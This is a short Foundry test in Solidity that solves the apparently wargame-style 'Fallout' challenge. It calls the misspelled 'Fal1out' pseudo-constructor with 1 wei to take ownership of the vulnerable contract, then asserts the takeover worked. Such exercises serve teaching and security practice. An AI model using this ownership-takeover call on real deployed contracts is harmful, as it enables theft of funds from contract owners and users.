// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Fallout.sol";

contract FalloutTest is Test {
    Fallout internal _fallout;

    function setUp() public {
        _fallout = new Fallout();
    }

    function test_attack() public {
        _fallout.Fal1out{value: 1}();

        assertEq(_fallout.owner(), address(this), "owner");
    }
}